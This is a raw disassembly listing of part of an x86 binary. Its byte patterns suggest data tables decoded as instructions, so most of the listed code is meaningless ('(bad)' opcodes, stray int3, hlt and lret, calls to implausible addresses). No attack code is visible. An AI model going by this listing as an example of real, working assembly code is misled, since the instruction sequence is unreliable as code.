  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 de                	add    %bl,%dh
  406a0f:	04 be                	add    $0xbe,%al
  406a11:	02 5f 00             	add    0x0(%edi),%bl
  406a14:	78 20                	js     0x406a36
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	8b 1d 0e 00 61 00    	mov    0x61000e,%ebx
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 2f                	add    %ch,(%edi)
  406a2b:	01 c5                	add    %eax,%ebp
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 55 07             	add    %dl,0x7(%ebp)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 d0                	add    %dl,%al
  406a47:	26 d2 02             	rolb   %cl,%es:(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 b3 04 da    	add    %dl,-0x25fb4d00(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 ab 09 e1 02 68    	add    %ch,0x6802e109(%ebx)
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 70 15             	add    %dh,0x15(%eax)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 48 1b             	add    %cl,0x1b(%eax)
  406a80:	ef                   	out    %eax,(%dx)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 2f                	add    %ch,(%edi)
  406a8d:	20 f6                	and    %dh,%dh
  406a8f:	02 6e 00             	add    0x0(%esi),%ch
  406a92:	78 20                	js     0x406ab4
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	8b 1d 0e 00 70 00    	mov    0x70000e,%ebx
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 35 09 84 01 70    	add    %dh,0x70018409
  406aad:	00 6c 59 00          	add    %ch,0x0(%ecx,%ebx,2)
  406ab1:	00 00                	add    %al,(%eax)
  406ab3:	00 96 00 fe 20 84    	add    %dl,-0x7bdf0200(%esi)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	12 23                	adc    (%ebx),%ah
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	c9                   	leave
  406ac7:	1b 00                	sbb    (%eax),%eax
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 99 05 00 00 01    	add    %bl,0x1000005(%ecx)
  406ad1:	00 c0                	add    %al,%al
  406ad3:	06                   	push   %es
  406ad4:	00 00                	add    %al,(%eax)
  406ad6:	01 00                	add    %eax,(%eax)
  406ad8:	ba 19 00 00 01       	mov    $0x1000019,%edx
  406add:	00 4c 1a 00          	add    %cl,0x0(%edx,%ebx,1)
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 e4                	add    %ah,%ah
  406ae5:	07                   	pop    %es
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	c0 02 00             	rolb   $0x0,(%edx)
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 88 01 00 00 01    	add    %cl,0x1000001(%eax)
  406af5:	00 24 03             	add    %ah,(%ebx,%eax,1)
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	03 09                	add    (%ecx),%ecx
  406afe:	00 00                	add    %al,(%eax)
  406b00:	01 00                	add    %eax,(%eax)
  406b02:	68 16 00 00 02       	push   $0x2000016
  406b07:	00 39                	add    %bh,(%ecx)
  406b09:	07                   	pop    %es
  406b0a:	00 00                	add    %al,(%eax)
  406b0c:	03 00                	add    (%eax),%eax
  406b0e:	67 04 00             	addr16 add $0x0,%al
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	ad                   	lods   %ds:(%esi),%eax
  406b15:	03 00                	add    (%eax),%eax
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 9e 08 00 00 01    	add    %bl,0x1000008(%esi)
  406b1f:	00 a6 15 00 00 01    	add    %ah,0x1000015(%esi)
  406b25:	00 7f 1a             	add    %bh,0x1a(%edi)
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	2b 02                	sub    (%edx),%eax
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	01 00                	add    %eax,(%eax)
  406b32:	f3 07                	repz pop %es
  406b34:	00 00                	add    %al,(%eax)
  406b36:	01 00                	add    %eax,(%eax)
  406b38:	b8 09 00 00 01       	mov    $0x1000009,%eax
  406b3d:	00 73 02             	add    %dh,0x2(%ebx)
  406b40:	00 00                	add    %al,(%eax)
  406b42:	02 00                	add    (%eax),%al
  406b44:	1b 09                	sbb    (%ecx),%ecx
  406b46:	00 00                	add    %al,(%eax)
  406b48:	03 00                	add    (%eax),%eax
  406b4a:	24 06                	and    $0x6,%al
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	4b                   	dec    %ebx
  406b51:	01 00                	add    %eax,(%eax)
  406b53:	00 01                	add    %al,(%ecx)
  406b55:	00 0d 1e 00 00 02    	add    %cl,0x200001e
  406b5b:	00 38                	add    %bh,(%eax)
  406b5d:	1e                   	push   %ds
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	d9 01                	flds   (%ecx)
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	f4                   	hlt
  406b69:	24 00                	and    $0x0,%al
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 be 07 00 00 03    	add    %bh,0x3000007(%esi)
  406b73:	00 cb                	add    %cl,%bl
  406b75:	06                   	push   %es
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	a1 1b 00 00 02       	mov    0x200001b,%eax
  406b7f:	00 93 01 00 00 01    	add    %dl,0x1000001(%ebx)
  406b85:	00 43 0a             	add    %al,0xa(%ebx)
  406b88:	00 00                	add    %al,(%eax)
  406b8a:	02 00                	add    (%eax),%al
  406b8c:	92                   	xchg   %eax,%edx
  406b8d:	04 00                	add    $0x0,%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 a1 00 00 00 01    	add    %ah,0x1000000(%ecx)
  406b97:	00 c8                	add    %cl,%al
  406b99:	25 00 00 01 00       	and    $0x10000,%eax
  406b9e:	56                   	push   %esi
  406b9f:	02 00                	add    (%eax),%al
  406ba1:	00 01                	add    %al,(%ecx)
  406ba3:	00 d8                	add    %bl,%al
  406ba5:	02 00                	add    (%eax),%al
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 61 15             	add    %ah,0x15(%ecx)
  406bac:	00 00                	add    %al,(%eax)
  406bae:	01 00                	add    %eax,(%eax)
  406bb0:	91                   	xchg   %eax,%ecx
  406bb1:	12 00                	adc    (%eax),%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 e3                	add    %ah,%bl
  406bb7:	14 00                	adc    $0x0,%al
  406bb9:	00 01                	add    %al,(%ecx)
  406bbb:	00 6e 01             	add    %ch,0x1(%esi)
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	01 00                	add    %eax,(%eax)
  406bc2:	21 01                	and    %eax,(%ecx)
  406bc4:	00 00                	add    %al,(%eax)
  406bc6:	01 00                	add    %eax,(%eax)
  406bc8:	2b 25 00 00 01 00    	sub    0x10000,%esp
  406bce:	bd 14 00 00 02       	mov    $0x2000014,%ebp
  406bd3:	00 e7                	add    %ah,%bh
  406bd5:	24 00                	and    $0x0,%al
  406bd7:	00 01                	add    %al,(%ecx)
  406bd9:	00 fa                	add    %bh,%dl
  406bdb:	0c 00                	or     $0x0,%al
  406bdd:	00 01                	add    %al,(%ecx)
  406bdf:	00 7f 07             	add    %bh,0x7(%edi)
  406be2:	00 00                	add    %al,(%eax)
  406be4:	01 00                	add    %eax,(%eax)
  406be6:	c9                   	leave
  406be7:	08 00                	or     %al,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 c6                	add    %al,%dh
  406bed:	03 00                	add    (%eax),%eax
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 04 23             	add    %al,(%ebx,%eiz,1)
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	81 05 00 00 01 00 af 	addl   $0x1baf,0x10000
  406bff:	1b 00 00 
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	b8 03 00 00 01       	mov    $0x1000003,%eax
  406c09:	00 04 08             	add    %al,(%eax,%ecx,1)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	f7 17                	notl   (%edi)
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	d2 03                	rolb   %cl,(%ebx)
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	04 07                	add    $0x7,%al
  406c1e:	00 00                	add    %al,(%eax)
  406c20:	01 00                	add    %eax,(%eax)
  406c22:	d6                   	salc
  406c23:	23 00                	and    (%eax),%eax
  406c25:	00 02                	add    %al,(%edx)
  406c27:	00 27                	add    %ah,(%edi)
  406c29:	04 00                	add    $0x0,%al
  406c2b:	00 01                	add    %al,(%ecx)
  406c2d:	00 2a                	add    %ch,(%edx)
  406c2f:	1e                   	push   %ds
  406c30:	00 00                	add    %al,(%eax)
  406c32:	01 00                	add    %eax,(%eax)
  406c34:	66 21 00             	and    %ax,(%eax)
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 2d 08 00 00 01    	add    %ch,0x1000008
  406c3f:	00 f9                	add    %bh,%cl
  406c41:	14 00                	adc    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 d1                	add    %dl,%cl
  406c47:	24 00                	and    $0x0,%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a5 05 00 00 01    	add    %ah,0x1000005(%ebp)
  406c51:	00 19                	add    %bl,(%ecx)
  406c53:	04 00                	add    $0x0,%al
  406c55:	00 01                	add    %al,(%ecx)
  406c57:	00 5c 01 00          	add    %bl,0x0(%ecx,%eax,1)
  406c5b:	00 01                	add    %al,(%ecx)
  406c5d:	00 c8                	add    %cl,%al
  406c5f:	14 00                	adc    $0x0,%al
  406c61:	00 01                	add    %al,(%ecx)
  406c63:	00 88 03 00 00 01    	add    %cl,0x1000003(%eax)
  406c69:	00 85 08 00 00 01    	add    %al,0x1000008(%ebp)
  406c6f:	00 ac 23 00 00 01 00 	add    %ch,0x10000(%ebx,%eiz,1)
  406c76:	2e 1b 00             	sbb    %cs:(%eax),%eax
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 f3                	add    %dh,%bl
  406c7d:	1a 00                	sbb    (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 66 1a             	add    %ah,0x1a(%esi)
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	3e 08 00             	or     %al,%ds:(%eax)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 10                	add    %dl,(%eax)
  406c8f:	25 00 00 01 00       	and    $0x10000,%eax
  406c94:	3e 06                	ds push %es
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	c8 12 00 00          	enter  $0x12,$0x0
  406c9e:	01 00                	add    %eax,(%eax)
  406ca0:	10 02                	adc    %al,(%edx)
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	88 26                	mov    %ah,(%esi)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	97                   	xchg   %eax,%edi
  406cad:	1a 00                	sbb    (%eax),%al
  406caf:	00 01                	add    %al,(%ecx)
  406cb1:	00 14 14             	add    %dl,(%esp,%edx,1)
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	02 1e                	add    (%esi),%bl
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	85 1b                	test   %ebx,(%ebx)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	45                   	inc    %ebp
  406cc5:	16                   	push   %ss
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	b5 02                	mov    $0x2,%ch
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	fc                   	cld
  406cd1:	02 00                	add    (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 4e 0a             	add    %cl,0xa(%esi)
  406cd8:	00 00                	add    %al,(%eax)
  406cda:	01 00                	add    %eax,(%eax)
  406cdc:	d5 09                	aad    $0x9
  406cde:	00 00                	add    %al,(%eax)
  406ce0:	01 00                	add    %eax,(%eax)
  406ce2:	12 05 00 00 02 00    	adc    0x20000,%al
  406ce8:	fe 03                	incb   (%ebx)
  406cea:	00 00                	add    %al,(%eax)
  406cec:	01 00                	add    %eax,(%eax)
  406cee:	17                   	pop    %ss
  406cef:	03 00                	add    (%eax),%eax
  406cf1:	00 01                	add    %al,(%ecx)
  406cf3:	00 1b                	add    %bl,(%ebx)
  406cf5:	15 00 00 02 00       	adc    $0x20000,%eax
  406cfa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406cfb:	07                   	pop    %es
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	81 06 00 00 01 00    	addl   $0x10000,(%esi)
  406d06:	59                   	pop    %ecx
  406d07:	04 00                	add    $0x0,%al
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 1c 02             	add    %bl,(%edx,%eax,1)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	eb 04                	jmp    0x406d18
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	3a 05 00 00 01 00    	cmp    0x10000,%al
  406d1e:	05 18 00 00 02       	add    $0x2000018,%eax
  406d23:	00 3a                	add    %bh,(%edx)
  406d25:	02 00                	add    (%eax),%al
  406d27:	00 01                	add    %al,(%ecx)
  406d29:	00 63 05             	add    %ah,0x5(%ebx)
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	d5 08                	aad    $0x8
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	41                   	inc    %ecx
  406d37:	1a 00                	sbb    (%eax),%al
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 0f                	add    %cl,(%edi)
  406d3d:	09 00                	or     %eax,(%eax)
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 8e 06 00 00 02    	add    %cl,0x2000006(%esi)
  406d47:	00 4c 08 00          	add    %cl,0x0(%eax,%ecx,1)
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 39                	add    %bh,(%ecx)
  406d4f:	15 00 00 02 00       	adc    $0x20000,%eax
  406d54:	63 07                	arpl   %eax,(%edi)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	1f                   	pop    %ds
  406d5b:	05 00 00 01 00       	add    $0x10000,%eax
  406d60:	b0 00                	mov    $0x0,%al
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 96 22 bb    	add    %dh,-0x44dd6a00(%ecx)
  406d6f:	01 b1 00 89 23 bf    	add    %esi,-0x40dc7700(%ecx)
  406d75:	01 b1 00 ae 21 0e    	add    %esi,0xe21ae00(%ecx)
  406d7b:	00 b9 00 73 1d 64    	add    %bh,0x641d7300(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 8b 1d 01 03 d1    	add    %cl,-0x2efcfee3(%ebx)
  406d89:	00 8b 1d 0e 00 d9    	add    %cl,-0x26fff1e3(%ebx)
  406d8f:	00 8b 1d 2e 03 e9    	add    %cl,-0x16fcd1e3(%ebx)
  406d95:	00 8b 1d 6b 01 f1    	add    %cl,-0xefe94e3(%ebx)
  406d9b:	00 8b 1d 6b 01 f9    	add    %cl,-0x6fe94e3(%ebx)
  406da1:	00 8b 1d 6b 01 01    	add    %cl,0x1016b1d(%ebx)
  406da7:	01 8b 1d 6b 01 09    	add    %ecx,0x9016b1d(%ebx)
  406dad:	01 8b 1d 6b 01 11    	add    %ecx,0x11016b1d(%ebx)
  406db3:	01 8b 1d 6b 01 19    	add    %ecx,0x19016b1d(%ebx)
  406db9:	01 8b 1d 6b 01 21    	add    %ecx,0x21016b1d(%ebx)
  406dbf:	01 8b 1d 6b 01 29    	add    %ecx,0x29016b1d(%ebx)
  406dc5:	01 8b 1d 6b 01 31    	add    %ecx,0x31016b1d(%ebx)
  406dcb:	01 8b 1d 4b 02 39    	add    %ecx,0x39024b1d(%ebx)
  406dd1:	01 8b 1d 0e 00 41    	add    %ecx,0x41000e1d(%ebx)
  406dd7:	01 8b 1d 6b 01 49    	add    %ecx,0x49016b1d(%ebx)
  406ddd:	01 c0                	add    %eax,%eax
  406ddf:	1a 7f 00             	sbb    0x0(%edi),%bh
  406de2:	51                   	push   %ecx
  406de3:	01 49 00             	add    %ecx,0x0(%ecx)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 df                	add    %ebx,%edi
  406deb:	21 7f 00             	and    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 3e                	add    %edi,(%esi)
  406df1:	18 84 00 09 00 8b 1d 	sbb    %al,0x1d8b0009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8f 00                	pop    (%eax)
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 7d 13             	add    %edi,0x13(%ebp)
  406e04:	2a 01                	sub    (%ecx),%al
  406e06:	61                   	popa
  406e07:	01 cf                	add    %ecx,%edi
  406e09:	13 d3                	adc    %ebx,%edx
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 8b 1d 2b 02 11    	add    %cl,0x11022b1d(%ebx)
  406e13:	00 a3 25 d9 03 69    	add    %ah,0x6903d925(%ebx)
  406e19:	01 7b 25             	add    %edi,0x25(%ebx)
  406e1c:	df 03                	filds  (%ebx)
  406e1e:	61                   	popa
  406e1f:	01 4b 1f             	add    %ecx,0x1f(%ebx)
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 bf 01 c7 00    	addl   $0xc701bf,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	82 14 eb 03          	adcb   $0x3,(%ebx,%ebp,8)
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	8b 1d 09 04 19 00    	mov    0x190409,%ebx
  406e38:	55                   	push   %ebp
  406e39:	12 01                	adc    (%ecx),%al
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 42 12             	add    %al,0x12(%edx)
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 3c             	roll   $0x3c,(%ecx)
  406e45:	26 16                	es push %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 ca                	add    %ecx,%edx
  406e4b:	21 1c 04             	and    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	8b 1d 0e 00 d1 01    	mov    0x1d1000e,%ebx
  406e56:	8d 23                	lea    (%ebx),%esp
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 ec                	add    %ebp,%esp
  406e5d:	1e                   	push   %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 5e 21             	add    %bl,0x21(%esi)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 4d 0b             	add    %cl,0xb(%ebp)
  406e6a:	bf 01 19 00 5e       	mov    $0x5e001901,%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 8b 1d 0e 00 a1    	add    %ecx,-0x5efff1e3(%ebx)
  406e79:	01 8b 1d 36 02 99    	add    %ecx,-0x66fdc9e3(%ebx)
  406e7f:	01 b5 1f 38 04 99    	add    %esi,-0x66fbc7e1(%ebp)
  406e85:	01 9d 13 70 01 c1    	add    %ebx,-0x3efe8fed(%ebp)
  406e8b:	01 ca                	add    %ecx,%edx
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 8d 23 49 04 f1    	add    %ecx,-0xefbb6dd(%ebp)
  406e97:	01 ac 0f 0e 00 f9 01 	add    %ebp,0x1f9000e(%edi,%ecx,1)
  406e9e:	8b 1d 4f 04 01 02    	mov    0x201044f,%ebx
  406ea4:	8b 1d 56 04 21 00    	mov    0x210456,%ebx
  406eaa:	8b 1d 5c 04 19 00    	mov    0x19045c,%ebx
  406eb0:	c8 22 66 04          	enter  $0x6622,$0x4
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	ac                   	lods   %ds:(%esi),%al
  406eb7:	13 47 02             	adc    0x2(%edi),%eax
  406eba:	21 00                	and    %eax,(%eax)
  406ebc:	44                   	inc    %esp
  406ebd:	22 6c 04 29          	and    0x29(%esp,%eax,1),%ch
  406ec1:	02 8b 1d 56 04 29    	add    0x2904561d(%ebx),%cl
  406ec7:	00 8b 1d 78 04 31    	add    %cl,0x3104781d(%ebx)
  406ecd:	02 8b 1d 56 04 c1    	add    -0x3efba9e3(%ebx),%cl
  406ed3:	00 fd                	add    %bh,%ch
  406ed5:	0a 82 04 39 02 fa    	or     -0x5fdc6fc(%edx),%al
  406edb:	0e                   	push   %cs
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 c5                	add    %al,%ch
  406ee1:	1f                   	pop    %ds
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 ac 0f 0e 00 19 00 	add    %ch,0x19000e(%edi,%ecx,1)
  406eec:	ac                   	lods   %ds:(%esi),%al
  406eed:	0f 0e                	femms
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 ac 0f 0e 00 c1 00 	add    %ch,0xc1000e(%edi,%ecx,1)
  406ef8:	f5                   	cmc
  406ef9:	0a a1 04 49 02 49    	or     0x49024904(%ecx),%ah
  406eff:	00 a7 04 c1 00 02    	add    %ah,0x200c104(%edi)
  406f05:	0b ae 04 51 02 8b    	or     -0x74fdaefc(%esi),%ebp
  406f0b:	1d 56 04 49 01       	sbb    $0x1490456,%eax
  406f10:	8b 1d b6 04 49 01    	mov    0x14904b6,%ebx
  406f16:	32 23                	xor    (%ebx),%ah
  406f18:	bd 04 61 02 01       	mov    $0x1026104,%ebp
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	4b                   	dec    %ebx
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 18                	add    %bl,(%eax)
  406f29:	17                   	pop    %ss
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 11                	add    %dl,(%ecx)
  406f2f:	10 de                	adc    %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 8b 1d 2b 02 c1    	add    -0x3efdd4e3(%ebx),%cl
  406f39:	00 52 19             	add    %dl,0x19(%edx)
  406f3c:	15 02 c1 00 8d       	adc    $0x8d00c102,%eax
  406f41:	14 0e                	adc    $0xe,%al
  406f43:	00 61 02             	add    %ah,0x2(%ecx)
  406f46:	df 21                	fbld   (%ecx)
  406f48:	9a 00 71 02 56 21 0a 	lcall  $0xa21,$0x56027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	c4 1e                	les    (%esi),%ebx
  406f54:	c7 00 a1 02 4a 0f    	movl   $0xf4a02a1,(%eax)
  406f5a:	01 05 79 02 8b 1d    	add    %eax,0x1d8b0279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 78 20             	add    0x20(%eax),%bh
  406f66:	07                   	pop    %es
  406f67:	05 81 02 42 0e       	add    $0xe420281,%eax
  406f6c:	0d 05 a9 02 8b       	or     $0x8b02a905,%eax
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 e0 0e 47    	add    0x470ee002(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 48 26             	add    %ecx,0x26(%eax)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 df                	add    %bh,%bl
  406f83:	1e                   	push   %ds
  406f84:	13 05 81 02 13 17    	adc    0x17130281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 8b 1d 0e    	add    %cl,0xe1d8b02(%ecx)
  406f91:	00 89 02 98 0e 6b    	add    %cl,0x6b0e9802(%ecx)
  406f97:	01 b1 02 82 0e 47    	add    %esi,0x470e8202(%ecx)
  406f9d:	02 a1 02 a0 18 c7    	add    -0x38e75ffe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 16                	add    %edx,(%esi)
  406fa7:	21 1a                	and    %ebx,(%edx)
  406fa9:	05 89 02 a7 20       	add    $0x20a70289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 5f 0e             	add    0xe(%edi),%bl
  406fb4:	20 05 89 02 a6 24    	and    %al,0x24a60289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 32 23 27    	add    0x27233202(%ecx),%al
  406fc1:	05 c1 02 dd 1c       	add    $0x1cdd02c1,%eax
  406fc6:	30 05 c9 02 c7 0f    	xor    %al,0xfc702c9
  406fcc:	c7 00 91 02 98 25    	movl   $0x25980291,(%eax)
  406fd2:	35 05 c1 01 16       	xor    $0x1601c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 dc 11       	add    $0x11dc0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 c2 20       	add    $0x20c202d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	01 10                	add    %edx,(%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 8b 1d 4c 05 d9    	add    -0x26fab3e3(%ebx),%cl
  406ff3:	02 3e                	add    (%esi),%bh
  406ff5:	1f                   	pop    %ds
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 a5 0e c3       	mov    0xc30ea502,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 16                	add    %edx,(%esi)
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 8b 1d       	add    $0x1d8b0299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 40 0f             	add    0xf(%eax),%al
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 a6 14 c3 00 a1    	add    -0x5eff3cec(%esi),%ah
  407017:	02 b5 0e c7 00 89    	add    -0x76ff38f2(%ebp),%dh
  40701d:	02 25 14 4b 02 89    	add    0x89024b14,%ah
  407023:	02 a0 11 4b 02 59    	add    0x59024b11(%eax),%ah
  407029:	01 40 23             	add    %eax,0x23(%eax)
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	1f                   	pop    %ds
  407031:	26 c3                	es ret
  407033:	00 a1 02 f8 22 c7    	add    %ah,-0x38dd07fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 8b 1d 6b 01 f9    	add    -0x6fe94e3(%ebx),%cl
  407041:	02 16                	add    (%esi),%dl
  407043:	12 23                	adc    (%ebx),%ah
